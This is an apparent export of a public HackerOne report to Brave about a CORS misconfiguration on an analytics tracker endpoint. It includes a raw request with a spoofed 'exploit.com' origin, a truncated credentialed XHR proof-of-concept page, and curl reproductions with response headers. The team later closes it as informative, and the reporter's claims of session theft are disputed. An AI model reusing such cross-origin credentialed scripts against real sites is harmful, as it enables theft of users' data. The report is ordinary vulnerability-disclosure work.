{"id":954512,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTQ1MTI=","url":"https://hackerone.com/reports/954512","title":"Cross-origin resource sharing misconfiguration (CORS)","state":"Closed","substate":"informative","severity_rating":"none","readable_substate":"Informative","created_at":"2020-08-09T16:57:44.973Z","submitted_at":"2020-08-09T16:57:45.118Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"drwx","url":"/drwx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15688,"url":"https://hackerone.com/brave","handle":"brave","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Brave Software","twitter_handle":"brave","website":"https://brave.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-04T00:34:52.551Z","bug_reporter_agreed_on_going_public_at":"2020-09-04T00:18:53.476Z","team_member_agreed_on_going_public_at":"2020-09-04T00:34:52.462Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi!\n\nIn this report I want to describe High level bug which can seriously compromise a user account.\n\nIf I am authorize on this site, I can steal user's sessions, some personal information or do some action.\n\nIn my tests, I found the relevant vulnerability using different methods. I detected the CORS vulnerability at the relevant address with the OPTIONS method. In addition, the server version information is also observed in the relevant response.\n\nSteps for reproduce\n\n1) Send this request\n\nOPTIONS /piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026rec=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt_ms=3109\u0026pv_id= HTTP/1.1\nHost: analytics.brave.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\nAccept: image/webp,*/*\nOrigin: exploit.com\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://brave.com/million/\n\nIn response headers you can see headers:\n\nAccess-Control-Allow-Origin: exploit.com\nAccess-Control-Allow-Credentials: true\n\nSo you can write exploit:\n\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n   \u003chead\u003e\n      \u003cscript\u003e\n         function cors() {\n            var xhttp = new XMLHttpRequest();\n                xhttp.onreadystatechange = function() {\n                    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n                        document.getElementById(\"emo\").innerHTML = alert(this.responseText);\n            }\n         };\n         xhttp.open(\"GET\", \"/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026rec=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt_ms=3109\u0026pv_id=\", true);\n         xhttp.withCredentials = true;\n         xhttp.send();\n         }\n      \u003c/script\u003e\n   \u003c/head\u003e\n  \nRather than using a wild card or programmatically verifying supplied origins, use a white list of trusted domains.\n\n## Impact\n\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server. Attacker can perform any action in the user's account, bypassing CSRF tokes.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":941945,"file_name":"Origin.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hM4gaTHnJ5DJz9bcSos1MZFx?response-content-disposition=attachment%3B%20filename%3D%22Origin.png%22%3B%20filename%2A%3DUTF-8%27%27Origin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154504Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=935b7d28b17f4655dd2b7fa3fa21df573509a2375740af861e82fa625b077552","file_size":48624,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"severity":{"rating":"none","author_type":"Team"},"structured_scope":{"databaseId":7965,"asset_type":"URL","asset_identifier":"brave.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8888881,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.\n","automated_response":false,"created_at":"2020-08-09T20:44:54.883Z","updated_at":"2020-08-09T20:44:54.883Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8899625,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to reproduce using the following curl command:\n\n    curl -X OPTIONS -i 'https://analytics.brave.com/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026rec=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt_ms=3109\u0026pv_id=' -H 'origin: https://fmarier.org'\n\nbut also with `POST`, `HEAD`, `PUT`, `DELETE`. Only `GET` didn't work.","automated_response":false,"created_at":"2020-08-11T03:02:42.814Z","updated_at":"2020-08-11T03:02:42.814Z","actor":{"username":"fmarier","cleared":false,"url":"/fmarier","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/164/5ccc7f221450d705333b28dc1d4c0eb673b24684_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8900658,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello fmarier,\n\nExcept for the GET method, the same security vulnerability problem was detected in all methods. Below is the output of the related security vulnerability results in the requests I made in different methods.\n\n/home/furkan# curl -X PUT -i 'https://analytics.brave.com/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026rec\n=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt_\nms=3109\u0026pv_id=' -H 'origin: https://fmarier.org'\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 43\nServer: Apache/2.4.29 (Ubuntu)\nAccess-Control-Allow-Origin: https://fmarier.org\nAccess-Control-Allow-Credentials: true\nContent-Type: image/gif\nAccept-Ranges: bytes\nDate: Tue, 11 Aug 2020 06:21:57 GMT\nVia: 1.1 varnish\nX-Served-By: cache-ams21036-AMS\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1597126916.319530,VS0,VE699\n\n*********************************************************************************************\n/home/furkan# curl -X HEAD -i 'https://analytics.brave.com/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026re\nc=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt\n_ms=3109\u0026pv_id=' -H 'origin: https://fmarier.org'\nWarning: Setting custom HTTP method to HEAD with -X/--request may not work the\nWarning: way you want. Consider using -I/--head instead.\nHTTP/1.1 200 OK\nConnection: keep-alive\nServer: Apache/2.4.29 (Ubuntu)\nAccess-Control-Allow-Origin: https://fmarier.org\nAccess-Control-Allow-Credentials: true\nContent-Type: image/gif\nAccept-Ranges: bytes\nDate: Tue, 11 Aug 2020 06:22:20 GMT\nVia: 1.1 varnish\nX-Served-By: cache-fra19149-FRA\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1597126939.491124,VS0,VE695\n\n****************************************************************************\n\n/home/furkan# curl -X DELETE -i 'https://analytics.brave.com/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026\nrec=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026\ngt_ms=3109\u0026pv_id=' -H 'origin: https://fmarier.org'\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 43\nServer: Apache/2.4.29 (Ubuntu)\nAccess-Control-Allow-Origin: https://fmarier.org\nAccess-Control-Allow-Credentials: true\nContent-Type: image/gif\nAccept-Ranges: bytes\nDate: Tue, 11 Aug 2020 06:22:53 GMT\nVia: 1.1 varnish\nX-Served-By: cache-ams21061-AMS\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1597126973.079939,VS0,VE677\n\n*************************************************************************\n/home/furkan# curl -X POST -i 'https://analytics.brave.com/piwik.php?action_name=%241%20Million%20Token%20Giveaway%20%7C%20Brave%20Browser\u0026idsite=2\u0026re\nc=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt\n_ms=3109\u0026pv_id=' -H 'origin: https://fmarier.org'\nHTTP/1.1 200 OK\nConnection: keep-alive\nContent-Length: 43\nServer: Apache/2.4.29 (Ubuntu)\nAccess-Control-Allow-Origin: https://fmarier.org\nAccess-Control-Allow-Credentials: true\nContent-Type: image/gif\nAccept-Ranges: bytes\nDate: Tue, 11 Aug 2020 06:26:41 GMT\nVia: 1.1 varnish\nX-Served-By: cache-hhn4042-HHN\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1597127201.175810,VS0,VE661","automated_response":false,"created_at":"2020-08-11T06:26:54.298Z","updated_at":"2020-08-11T06:26:54.298Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8900685,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In addition, the images of the obtained printouts are presented for your information in the attachment.","automated_response":false,"created_at":"2020-08-11T06:31:11.259Z","updated_at":"2020-08-11T06:31:11.259Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":943877,"filename":"curl_Post_DELETE.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Mp5ELwfVfQtRnwuZ19ZtAas4?response-content-disposition=attachment%3B%20filename%3D%22curl_Post_DELETE.png%22%3B%20filename%2A%3DUTF-8%27%27curl_Post_DELETE.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154505Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e49491bb8276e877a1ae807e39e84876da9de6103b50c1d73a341ecfb5cf7065"},{"id":943876,"filename":"curl_OPTIONS_PUT_HEAD.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4T62jFXmQKBNkfZwC91d31Wq?response-content-disposition=attachment%3B%20filename%3D%22curl_OPTIONS_PUT_HEAD.png%22%3B%20filename%2A%3DUTF-8%27%27curl_OPTIONS_PUT_HEAD.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154505Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=137338afe63a9fd090e634420e7e8b83370bec9be883df4149718d6114977559"}],"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8900717,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This critical security vulnerability must be addressed urgently in all methods. In all methods, the relevant weakness should be closed.","automated_response":false,"created_at":"2020-08-11T06:35:19.743Z","updated_at":"2020-08-11T06:35:19.743Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8910046,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-08-11T20:48:12.438Z","updated_at":"2020-08-11T20:48:12.438Z","additional_data":{"old_severity":"High","new_severity":"Low","old_severity_id":813438,"new_severity_id":815709},"actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8910082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks for the report. we don't see this as a critical issue because we don't know of any concrete POST endpoints that return sensitive data for logged-in users. we are happy to adjust this if you find such an endpoint. \n\nthis is in our todo list.","automated_response":false,"created_at":"2020-08-11T20:52:57.562Z","updated_at":"2020-08-11T20:52:57.562Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8910371,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-08-11T21:41:18.583Z","updated_at":"2020-08-11T21:41:18.583Z","actor":{"username":"bkero","cleared":false,"url":"/bkero","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8912819,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Having it on your to-do list shouldn't prevent me from finding weaknesses and getting any rewards. As a result, I looked through the logs of all the requests I made to find this vulnerability. I found these logs with a single URL with the origin method turned on. I ran tests on this URL and directory and as a result found the vulnerability. \n\nThe risk here is that a web client can put any value into the Origin request HTTP header in order to force web application to provide it the target resource content. In the case of a Browser web client, the header value is managed by the browser but another “web client” can be used (like Curl/Wget/Burp suite/…) to change/override the “Origin” header value. For this reason it is not recommended to use the Origin header to authenticate requests as coming from your site.\n\nAccess-Control-Allow-Credentials: true\n\nWithout that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.\n\nHowever, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.\n\nALSO fmarier asked me to test with curl command in different methods. He stated that they could not reach conclusions by using different methods. Based on this, I did the test again and I communicated that I concluded the same security vulnerability from all methods.\n=====================\nPOST, HEAD, PUT, DELETE\n=====================","automated_response":false,"created_at":"2020-08-12T07:07:56.279Z","updated_at":"2020-08-12T07:07:56.279Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8918291,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@furkanozcan I have confirmed your findings, found the root cause and have a solution ready to go, though it has not been deployed yet.\n\nYou are correct that this class of problems can lead to severe vulnerabilities depending on the endpoint that is affected. We are currently trying to access the severity of the issue and will update this report once we have new information.","automated_response":false,"created_at":"2020-08-12T17:24:22.643Z","updated_at":"2020-08-12T17:24:22.643Z","actor":{"username":"fmarier","cleared":false,"url":"/fmarier","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/164/5ccc7f221450d705333b28dc1d4c0eb673b24684_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8918349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@fmarier It is okay.  We test it again after taking the necessary security measures regarding this security vulnerability.  I expect your return.  Thank you.","automated_response":false,"created_at":"2020-08-12T17:32:23.569Z","updated_at":"2020-08-12T17:32:23.569Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8953369,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @fmarier \n\nYour time to cover vulnerabilities is very slow. :) I can also provide solution suggestions to fix the CORS vulnerability. I would like the latest status information. ","automated_response":false,"created_at":"2020-08-17T07:25:17.675Z","updated_at":"2020-08-17T07:25:17.675Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9124610,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Sorry for the delay in getting back to you @furkanozcan . I just heard back from the Matomo security team and they don't consider this a security vulnerability since it only affects the tracker component of Matomo, which accepts accepts incoming analytics data and doesn't give access to any of the stored information.\n\nNote that security vulnerabilities in third-party software are out-of-scope for our bug bounty program unless we decide that a separate fix is warranted, which is not the case here.","automated_response":false,"created_at":"2020-09-04T00:09:27.773Z","updated_at":"2020-09-04T00:09:27.773Z","actor":{"username":"fmarier","cleared":false,"url":"/fmarier","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/164/5ccc7f221450d705333b28dc1d4c0eb673b24684_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9124622,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-04T00:18:53.520Z","updated_at":"2020-09-04T00:18:53.520Z","first_to_agree":true,"actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9124650,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"To be clear, even if we had a fix for this, our fix would have had to be accepted by Matomo since it's an upstream bug in their software. I will disclose this, but I suggest reporting issues like this to them in the future. 